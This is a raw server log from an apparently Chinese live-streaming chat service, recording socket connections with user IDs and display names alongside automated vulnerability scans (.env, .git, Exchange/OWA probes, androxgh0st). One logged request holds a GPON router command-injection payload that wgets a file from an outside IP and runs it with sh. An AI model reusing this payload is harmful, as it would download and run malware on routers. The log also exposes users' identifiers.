[2021-06-14 00:15:39.236] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-14 00:55:07.556] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/.env 200 0ms
[2021-06-14 00:55:11.479] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/ {"0x":["androxgh0st"]} 405 0ms
[2021-06-14 00:57:09.434] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/owa/ 200 1ms
[2021-06-14 02:05:37.220] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/actuator/health 200 0ms
[2021-06-14 02:07:08.062] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/actuator/health 200 0ms
[2021-06-14 02:16:13.073] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 02:16:14.001] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 02:22:15.351] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 03:15:28.440] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/owa/ 200 0ms
[2021-06-14 03:19:35.667] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/.env 200 0ms
[2021-06-14 03:19:36.559] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/ {"0x":["androxgh0st"]} 405 0ms
[2021-06-14 03:45:05.799] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 04:01:47.230] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/owa/ 200 0ms
[2021-06-14 04:25:09.482] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/.git/HEAD 200 0ms
[2021-06-14 04:50:06.283] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-14 05:04:19.559] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 05:05:11.317] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 05:08:46.001] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 05:51:37.938] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 05:54:35.594] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 06:15:11.873] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application 200 1ms
[2021-06-14 06:17:34.457] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application 200 0ms
[2021-06-14 06:46:15.658] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250//a2billing/customer/templates/default/footer.tpl 200 0ms
[2021-06-14 06:48:26.057] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250//a2billing/customer/templates/default/footer.tpl 200 0ms
[2021-06-14 07:38:51.820] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 07:38:52.978] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 08:52:41.479] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-14 10:00:02.230] [INFO] - [47.101.196.50] GET http://47.100.89.2:8250/ 200 0ms
[2021-06-14 10:38:01.606] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-14 11:02:34.653] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-14 11:42:14.597] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 11:45:41.196] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 11:45:42.007] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 11:46:45.354] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-14 11:47:24.338] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-14 11:47:44.768] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/robots.txt 200 0ms
[2021-06-14 11:47:45.748] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/sitemap.xml 200 0ms
[2021-06-14 11:47:46.713] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/.well-known/security.txt 200 0ms
[2021-06-14 11:47:48.054] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/favicon.ico 200 1ms
[2021-06-14 11:47:56.350] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 12:23:55.526] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 12:27:00.581] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 12:32:30.689] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-14 12:56:42.681] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-14 13:03:22.614] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne8vnkf' }
[2021-06-14 13:03:22.614] [INFO] - [ 'q1lHcCSmickazhqkAGIN', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 13:04:20.370] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '3ed8b9b168df466ba3f8c9a83d1fc0ae',
  username: 'A V音响摄像@郭经理（聪影传媒）',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne8v_r0' }
[2021-06-14 13:04:20.371] [INFO] - [ 'x9LQO_wyiZZGRgeMAGIO', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 14:02:08.076] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne97EOM' }
[2021-06-14 14:02:08.077] [INFO] - [ 'HsEicDgBTgy8WDtaAGIP', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 14:04:44.529] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-14 14:05:51.995] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9852_' }
[2021-06-14 14:05:51.995] [INFO] - [ 'pXt8Mio5O_hGiwZKAGIQ', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 14:10:36.387] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne99AUc' }
[2021-06-14 14:10:36.387] [INFO] - [ '8l10s4rvaceJ95a6AGIR', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 14:11:07.566] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne99I5t' }
[2021-06-14 14:11:07.566] [INFO] - [ 'DfzifjNYCvPOTfl0AGIS', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 14:17:34.534] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '3ed8b9b168df466ba3f8c9a83d1fc0ae',
  username: 'A V音响摄像@郭经理（聪影传媒）',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9AmaE' }
[2021-06-14 14:17:34.534] [INFO] - [ 'syBCEGvV7uEi1vKFAGIT', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 14:21:18.933] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '3ed8b9b168df466ba3f8c9a83d1fc0ae',
  username: 'A V音响摄像@郭经理（聪影传媒）',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9BdI8' }
[2021-06-14 14:21:18.933] [INFO] - [ 'yh1xIZoV0UApUqw2AGIU', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 14:29:15.456] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9DRdn' }
[2021-06-14 14:29:15.456] [INFO] - [ 'yY8QQC2qGMWkOHSnAGIV', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 14:38:32.082] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9FZW_' }
[2021-06-14 14:38:32.082] [INFO] - [ 'KpUwWDYxfxZ3wgt0AGIW', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 14:42:49.540] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9GYNq' }
[2021-06-14 14:42:49.540] [INFO] - [ 'LF3JDggouB_m9hSnAGIX', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 14:46:20.798] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9HLyi' }
[2021-06-14 14:46:20.798] [INFO] - [ 'J-KvQEi2h6T4K2C0AGIY', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 14:53:04.353] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9IuUF' }
[2021-06-14 14:53:04.353] [INFO] - [ '6_GZfF25ae5UAqCKAGIZ', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 15:01:42.746] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '3ed8b9b168df466ba3f8c9a83d1fc0ae',
  username: 'A V音响摄像@郭经理（聪影传媒）',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9Kt27' }
[2021-06-14 15:01:42.747] [INFO] - [ '6br24l1MIpL2FyTzAGIa', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 15:02:32.377] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9L39V' }
[2021-06-14 15:02:32.377] [INFO] - [ 'oUwCv7Ag9KcvWV7dAGIb', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 15:02:40.648] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9L5Ax' }
[2021-06-14 15:02:40.648] [INFO] - [ 'Ekv92IaVX7jplYfIAGIc', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 15:07:52.173] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9MHER' }
[2021-06-14 15:07:52.173] [INFO] - [ '7dTP1YkcOMguc2mqAGId', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 15:27:56.065] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9Qt9G' }
[2021-06-14 15:27:56.065] [INFO] - [ 'ad0X8E6mhOUM3G6TAGIe', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 15:30:37.921] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9RUgE' }
[2021-06-14 15:30:37.922] [INFO] - [ 'CgWOS3QujChkIV_hAGIf', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 15:36:59.163] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9Sxpz' }
[2021-06-14 15:36:59.163] [INFO] - [ 'FO1ketzShfAu3h5BAGIg', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 15:39:09.558] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-14 15:39:28.582] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/sitemap.xml 200 0ms
[2021-06-14 15:39:30.482] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/.well-known/security.txt 200 0ms
[2021-06-14 15:39:31.888] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/favicon.ico 200 1ms
[2021-06-14 15:39:39.525] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-14 15:44:42.820] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9Uj0d' }
[2021-06-14 15:44:42.821] [INFO] - [ 'gF9VS6_oFGhAuxMxAGIh', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 15:46:50.202] [INFO] - query { rid: '6ea2741383eb4f429aee200c7df78513',
  uid: '381f1a10f9ee42bda332bf01fb49f664',
  username: '三五七',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Ne9VC6v' }
[2021-06-14 15:46:50.203] [INFO] - [ 'mfV6D3_s7iTPNBdPAGIi', '6ea2741383eb4f429aee200c7df78513' ]
[2021-06-14 15:47:16.399] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 15:47:16.517] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 15:47:16.578] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/favicon.ico 200 1ms
[2021-06-14 16:23:47.846] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/.env 200 0ms
[2021-06-14 16:23:48.844] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/ {"0x":["androxgh0st"]} 405 0ms
[2021-06-14 16:40:22.916] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/.env 200 0ms
[2021-06-14 16:40:23.636] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/ {"0x":["androxgh0st"]} 405 0ms
[2021-06-14 16:44:29.725] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f 200 0ms
[2021-06-14 16:48:32.363] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f 200 0ms
[2021-06-14 17:23:49.972] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-14 17:34:26.851] [INFO] - [74.120.14.40] GET http://47.100.89.2:8250/ 200 0ms
[2021-06-14 17:34:27.280] [INFO] - [74.120.14.40] GET http://47.100.89.2:8250/ 200 0ms
[2021-06-14 18:08:52.815] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://23.95.191.195/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 0ms
[2021-06-14 19:16:15.941] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '34bddff0e8e4440ca330db53a7394739',
  username: 'dongdong',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAF8HT' }
[2021-06-14 19:16:15.941] [INFO] - [ 'UsmCNP-UGbejiNdVAGIj', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:16:44.469] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '34bddff0e8e4440ca330db53a7394739',
  username: 'dongdong',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAFFFT' }
[2021-06-14 19:16:44.469] [INFO] - [ 'ffaLN9z4zHRLuMBoAGIk', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:17:08.697] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '9df66b7aa52346da8785c3d4bc3f37fd',
  username: '迎春',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAFKwn' }
[2021-06-14 19:17:08.697] [INFO] - [ 'ab2U0VHI2EONJ3YzAGIl', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:17:09.491] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '34bddff0e8e4440ca330db53a7394739',
  username: 'dongdong',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAFLMT' }
[2021-06-14 19:17:09.491] [INFO] - [ 'ZO9oLSueItqYvjZ_AGIm', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:19:57.717] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '34bddff0e8e4440ca330db53a7394739',
  username: 'dongdong',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAF-Qr' }
[2021-06-14 19:19:57.717] [INFO] - [ 'xVwJaU7A2JXfAGLSAGIn', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:21:11.197] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: 'e002f772d6bc4168b4c94703130fe8e3',
  username: '徐国龙',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAGGCu' }
[2021-06-14 19:21:11.198] [INFO] - [ 'eHNG9v8UcDgTd6SsAGIo', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:22:16.268] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '9df66b7aa52346da8785c3d4bc3f37fd',
  username: '迎春',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAGW63' }
[2021-06-14 19:22:16.268] [INFO] - [ 'CZ16xZNP62TSbTDfAGIp', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:22:53.079] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '9df66b7aa52346da8785c3d4bc3f37fd',
  username: '迎春',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAGf1-' }
[2021-06-14 19:22:53.079] [INFO] - [ 'GWTufzcIJQ6qKG19AGIq', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:23:12.325] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '34bddff0e8e4440ca330db53a7394739',
  username: 'dongdong',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAGjxS' }
[2021-06-14 19:23:12.326] [INFO] - [ '4RJXBFJuNrGkd7WgAGIr', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:23:29.526] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '9df66b7aa52346da8785c3d4bc3f37fd',
  username: '迎春',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAGn9l' }
[2021-06-14 19:23:29.528] [INFO] - [ 'VtdYcudLYLm0IZ5OAGIs', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:24:00.996] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '9df66b7aa52346da8785c3d4bc3f37fd',
  username: '迎春',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAGvhC' }
[2021-06-14 19:24:00.996] [INFO] - [ '1LV7hqz12RofJchIAGIt', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:24:55.061] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: 'd2ba4f6aab13444da8768e82ca33729c',
  username: '凌群',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAH6_Z' }
[2021-06-14 19:24:55.061] [INFO] - [ 'Gm-t5MSXE9lV_nc1AGIu', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:25:00.798] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: 'd2ba4f6aab13444da8768e82ca33729c',
  username: '凌群',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAH8Jp' }
[2021-06-14 19:25:00.799] [INFO] - [ '-smuIVEWwznjrlD-AGIv', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:25:27.528] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '7d836e34fe364ada91448a38f82ecbf4',
  username: '袁常华',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAHEeX' }
[2021-06-14 19:25:27.528] [INFO] - [ 'II3yUEKGjviXpk8UAGIw', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:27:13.545] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '34bddff0e8e4440ca330db53a7394739',
  username: 'dongdong',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAHeqL' }
[2021-06-14 19:27:13.545] [INFO] - [ 'xplNBMtJRkma9EdJAGIx', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:27:16.642] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '6796c6605c3049beb5ef280ec020e00a',
  username: '永远的狮子座TjN',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAHfMX' }
[2021-06-14 19:27:16.643] [INFO] - [ '6vOPwBwsLiPX9ON1AGIy', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:27:39.663] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: 'd2ba4f6aab13444da8768e82ca33729c',
  username: '凌群',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAHl9-' }
[2021-06-14 19:27:39.663] [INFO] - [ '0XHLsHOR5L7DdxHFAGIz', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:29:38.534] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '34bddff0e8e4440ca330db53a7394739',
  username: 'dongdong',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAICE0' }
[2021-06-14 19:29:38.535] [INFO] - [ 'guU4FcsKjSMQVewxAGI0', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:31:35.670] [INFO] - msg { role: 0,
  username: '袁常华',
  _id: 'II3yUEKGjviXpk8UAGIw',
  msg: '音乐和音频不同步' }
[2021-06-14 19:32:24.038] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '34bddff0e8e4440ca330db53a7394739',
  username: 'dongdong',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAIqe3' }
[2021-06-14 19:32:24.039] [INFO] - [ '2FJoIW3lSR7NJlG6AGI1', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:32:36.883] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '1f8a577e0a334818a1567843bf84ae52',
  username: '音乐之声',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAItrq' }
[2021-06-14 19:32:36.884] [INFO] - [ '5jG2c5o95KYhWg-jAGI2', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:32:53.416] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: 'd2ba4f6aab13444da8768e82ca33729c',
  username: '凌群',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAIxoo' }
[2021-06-14 19:32:53.417] [INFO] - [ '-dJ8gVSZ5jd56GQQAGI3', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:33:02.852] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: 'd2ba4f6aab13444da8768e82ca33729c',
  username: '凌群',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAI-6Z' }
[2021-06-14 19:33:02.853] [INFO] - [ '9xAKLMWPop-1KWtQAGI4', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:33:24.618] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '554f87a5338d49b68850450a4d61fd70',
  username: 'chris',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAJ3io' }
[2021-06-14 19:33:24.618] [INFO] - [ 'YQC9Vetk0-EbSfPaAGI5', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:33:45.410] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: 'd2ba4f6aab13444da8768e82ca33729c',
  username: '凌群',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAJ8Vg' }
[2021-06-14 19:33:45.410] [INFO] - [ 'KqGbEDGodnrBBb6BAGI6', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:34:01.123] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '554f87a5338d49b68850450a4d61fd70',
  username: 'chris',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAJCd0' }
[2021-06-14 19:34:01.123] [INFO] - [ 'aEOqihq6gl9mvLB_AGI7', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:34:12.095] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '554f87a5338d49b68850450a4d61fd70',
  username: 'chris',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAJFIK' }
[2021-06-14 19:34:12.096] [INFO] - [ '-jyXHR9JRlMyZ3MrAGI8', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:35:19.510] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: '34bddff0e8e4440ca330db53a7394739',
  username: 'dongdong',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAJVTO' }
[2021-06-14 19:35:19.510] [INFO] - [ 'KL5frCZ-nJCi32nhAGI9', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:36:48.085] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: 'd2ba4f6aab13444da8768e82ca33729c',
  username: '凌群',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAJr6S' }
[2021-06-14 19:36:48.085] [INFO] - [ 'ursmBcL91-nAXGw8AGI-', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:36:59.227] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: 'd2ba4f6aab13444da8768e82ca33729c',
  username: '凌群',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAJtqP' }
[2021-06-14 19:36:59.227] [INFO] - [ 'HLLml5Ha8aBbOOjMAGI_', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:37:50.769] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: 'be9e860157604fd39ed3500a8a19854b',
  username: '沁美文化-莫宏亮',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAK46J' }
[2021-06-14 19:37:50.769] [INFO] - [ 'EYTEVMHjeZH-pZ3oAGJA', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:38:22.505] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: 'be9e860157604fd39ed3500a8a19854b',
  username: '沁美文化-莫宏亮',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NeAKBrv' }
[2021-06-14 19:38:22.506] [INFO] - [ '3Qzbh7iz31mwDk2zAGJB', 'd014b16e1e9440e1a4f62a78ab9b2cef' ]
[2021-06-14 19:38:56.665] [INFO] - query { rid: 'd014b16e1e9440e1a4f62a78ab9b2cef',
  uid: 'be9e860157604fd39ed3500a8a19854b',
